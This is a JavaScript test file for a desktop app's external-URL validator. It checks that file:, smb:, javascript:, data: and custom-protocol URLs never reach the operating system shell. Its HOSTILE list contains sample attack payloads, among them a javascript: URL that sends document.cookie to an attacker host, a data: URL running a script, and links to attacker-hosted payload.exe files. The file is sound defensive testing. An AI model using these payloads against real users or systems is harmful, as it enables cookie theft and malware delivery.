'use strict';

/**
 * The rule for handing a URL to the operating system, and the surface that must obey it.
 *
 * The scheme cases below are the ones a remote page can actually produce from `window.open` or a link:
 * `file:`, `smb:`, `javascript:`, `data:` and any custom protocol handler an installer registered. Before
 * this rule existed, the window-open path gave all of them to `shell.openExternal`. The last test in this
 * file reads the real source of every call site, so a future raw `shell.openExternal(url)` fails the suite
 * instead of shipping.
 */

const test = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const path = require('node:path');

const externalUrl = require('../src/main/external-url.js');

/** A shell stand-in: the point of these tests is what reaches it. */
const fakeShell = () => ({ calls: [], async openExternal(url) { this.calls.push(url); } });

const HOSTILE = [
  'file:///C:/Windows/System32/calc.exe',
  'file://server/share/report.pdf',
  'smb://attacker/share/payload.exe',
  'javascript:fetch("https://attacker/?c="+document.cookie)',
  'data:text/html,<script>fetch("https://attacker/")</script>',
  'ms-msdt:/id PCWDiagnostic',
  'chrome://settings',
  'bop-internal://do-something',
  'myapp://open?path=C:\\\\',
  '\\\\attacker\\share\\payload.exe',
  'http://attacker.example/landing',
  'mailto:someone@example.com',
];

test('no scheme a page can produce is ever allowed to leave the app', () => {
  for (const url of HOSTILE) {
    const checked = externalUrl.validateExternalUrl(url);
    assert.strictEqual(checked.ok, false, `must refuse ${url}`);
    assert.ok(checked.reason, `a refusal names its reason: ${url}`);
  }
});

test('https anywhere is allowed, including a pasted uppercase scheme', () => {
  for (const url of ['https://example.com/x', 'HTTPS://example.com/x', 'HtTpS://EXAMPLE.com/x', 'https://[2001:db8::1]/x']) {
    assert.strictEqual(externalUrl.validateExternalUrl(url).ok, true, url);
    assert.strictEqual(externalUrl.isHttpsUrl(url), true, url);
  }
});

test('plain http is allowed only where it cannot leave the machine', () => {
  for (const url of ['http://localhost:8080/', 'http://127.0.0.1:1/', 'http://[::1]:8080/', 'HTTP://LOCALHOST:9/']) {
    assert.strictEqual(externalUrl.validateExternalUrl(url).ok, true, url);
    assert.strictEqual(externalUrl.isHttpsUrl(url), false, `${url} is http, not https`);
  }
  for (const url of ['http://example.com/', 'http://10.0.0.4/', 'http://192.168.1.5:8080/']) {
    assert.strictEqual(externalUrl.validateExternalUrl(url).ok, false, url);
  }
});

test('a URL that cannot be parsed is refused instead of guessed at', () => {
  for (const url of ['', '   ', 'example.com', '//example.com/x', 'not a url', null, undefined, 42, {}]) {
    const checked = externalUrl.validateExternalUrl(url);
    assert.strictEqual(checked.ok, false, String(url));
    assert.ok(['not-a-string', 'unparseable'].includes(checked.reason), `${String(url)} -> ${checked.reason}`);
  }
});

test('the window-open path hands hostile schemes to the validator, never to the shell', async () => {
  for (const url of HOSTILE) {
    const shell = fakeShell();
    const action = externalUrl.windowOpenAction(url, { allowed: false });
    assert.strictEqual(action, 'external', `${url} is not something Bop hosts`);
    const result = await externalUrl.openExternal(shell, url);
    assert.strictEqual(result.ok, false, `${url} must be refused`);
    assert.strictEqual(shell.calls.length, 0, `shell.openExternal must never see ${url}`);
  }
});

test('an allowed page opens its sign-in window here; an https page elsewhere is asked about', () => {
  assert.strictEqual(externalUrl.windowOpenAction('https://accounts.google.com/x', { allowed: true }), 'child');
  assert.strictEqual(externalUrl.windowOpenAction('https://accounts.google.com/x', { allowed: false }), 'prompt');
  assert.strictEqual(externalUrl.windowOpenAction('http://localhost:1/x', { allowed: false }), 'external');
});

test('https and loopback http do reach the shell exactly once', async () => {
  for (const url of ['https://example.com/x', 'http://localhost:8080/panel']) {
    const shell = fakeShell();
    const result = await externalUrl.openExternal(shell, url);
    assert.deepStrictEqual(result, { ok: true, url }, url);
    assert.deepStrictEqual(shell.calls, [url]);
  }
});

test('a refusal is logged and a broken logger cannot cause an open', async () => {
  const shell = fakeShell();
  const seen = [];
  await externalUrl.openExternal(shell, 'file:///C:/x', (reason) => seen.push(reason));
  assert.deepStrictEqual(seen, ['scheme:file:']);
  const broken = await externalUrl.openExternal(shell, 'file:///C:/x', () => { throw new Error('logger exploded'); });
  assert.strictEqual(broken.ok, false);
  assert.strictEqual(shell.calls.length, 0);
});

test('a shell that rejects is reported and not retried', async () => {
  const shell = { calls: [], async openExternal(url) { this.calls.push(url); throw new Error('OS said no'); } };
  const result = await externalUrl.openExternal(shell, 'https://example.com/x');
  assert.strictEqual(result.ok, false);
  assert.strictEqual(shell.calls.length, 1);
});

test('every shell.openExternal in the app is behind the one validated hand-off', () => {
  const mainDir = path.join(__dirname, '..', 'src', 'main');
  const files = fs.readdirSync(mainDir).filter((name) => name.endsWith('.js'));
  const raw = [];
  for (const name of files) {
    const source = fs.readFileSync(path.join(mainDir, name), 'utf8')
      .split('\n')
      .map((line) => line.replace(/\/\/.*$/, ''))         // no line comments
      .filter((line) => !/^\s*(\*|\/\*)/.test(line))      // no doc-comment lines
      .join('\n');
    source.split('\n').forEach((line, index) => {
      if (/shell\.openExternal\(/.test(line) && !/checked\.url/.test(line)) raw.push(`${name}:${index + 1}: ${line.trim()}`);
    });
  }
  assert.deepStrictEqual(raw, [], `shell.openExternal must only be called with a validated URL:\n${raw.join('\n')}`);

  // The single call site must sit inside the validated hand-off and pass it the parsed, checked URL.
  const handOff = fs.readFileSync(path.join(mainDir, 'external-url.js'), 'utf8');
  assert.ok(/await shell\.openExternal\(checked\.url\)/.test(handOff), 'external-url.js owns the one hand-off');
  assert.ok(/const checked = validateExternalUrl\(url\)/.test(handOff), 'the hand-off validates first');
  for (const name of files.filter((file) => file !== 'external-url.js')) {
    const source = fs.readFileSync(path.join(mainDir, name), 'utf8')
      .split('\n')
      .map((line) => line.replace(/\/\/.*$/, ''))
      .filter((line) => !/^\s*(\*|\/\*)/.test(line))
      .join('\n');
    assert.ok(!/shell\.openExternal/.test(source), `${name} must not open external URLs directly`);
  }
});
